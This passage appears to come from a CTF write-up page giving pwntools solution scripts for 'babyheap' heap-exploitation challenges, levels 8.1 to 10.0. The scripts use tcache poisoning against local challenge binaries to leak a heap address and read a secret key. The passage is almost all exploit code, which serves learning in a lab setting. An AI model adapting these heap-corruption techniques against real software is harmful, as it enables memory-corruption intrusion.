</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;/challenge/babyheap_level8.1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, p64(<span style="color:#ae81ff">0x00428c00</span>))
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, key)
</span></span><span style="display:flex;"><span>send_flag(p, key[:<span style="color:#ae81ff">0x10</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="level-90">level 9.0</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;/challenge/babyheap_level9.1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">64</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">64</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>tcache_0_addr <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(puts(p, <span style="color:#ae81ff">1</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#39;little&#39;</span>)
</span></span><span style="display:flex;"><span>print (hex(tcache_0_addr))
</span></span><span style="display:flex;"><span>print (hex(tcache_0_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">688</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">64</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>))
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, p64(<span style="color:#ae81ff">0x42a065</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>))
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">64</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">64</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">5</span>, p64(tcache_0_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">688</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">64</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>))
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> puts(p, <span style="color:#ae81ff">7</span>)<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>print (key)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># send_flag(p, key)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">80</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">80</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># tcache_0_addr = int.from_bytes(puts(p, 1)[:-1], &#39;little&#39;)</span>
</span></span><span style="display:flex;"><span>print (hex(tcache_0_addr))
</span></span><span style="display:flex;"><span>print (hex(tcache_0_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">688</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">64</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>))
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, p64(<span style="color:#ae81ff">0x42a065</span>))
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">80</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">80</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">5</span>, p64(tcache_0_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">688</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">64</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>))
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>key  <span style="color:#f92672">=</span> puts(p, <span style="color:#ae81ff">8</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> key
</span></span><span style="display:flex;"><span>print (key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>send_flag(p, key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="level-91">level 9.1</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;/challenge/babyheap_level9.1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">64</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">64</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>tcache_0_addr <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(puts(p, <span style="color:#ae81ff">1</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#39;little&#39;</span>)
</span></span><span style="display:flex;"><span>print (hex(tcache_0_addr))
</span></span><span style="display:flex;"><span>print (hex(tcache_0_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">672</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">64</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>))
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, p64(<span style="color:#ae81ff">0x0042b43c</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>))
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">64</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">64</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">5</span>, p64(tcache_0_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">672</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">64</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>))
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> puts(p, <span style="color:#ae81ff">7</span>)<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>print (key)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># send_flag(p, key)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">80</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">80</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># tcache_0_addr = int.from_bytes(puts(p, 1)[:-1], &#39;little&#39;)</span>
</span></span><span style="display:flex;"><span>print (hex(tcache_0_addr))
</span></span><span style="display:flex;"><span>print (hex(tcache_0_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">672</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">64</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>))
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, p64(<span style="color:#ae81ff">0x0042b43c</span>))
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">80</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">80</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">5</span>, p64(tcache_0_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">672</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">64</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>))
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>key  <span style="color:#f92672">=</span> puts(p, <span style="color:#ae81ff">8</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> key
</span></span><span style="display:flex;"><span>print (key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>send_flag(p, key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="level-100">level 10.0</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">quit</span>(p):
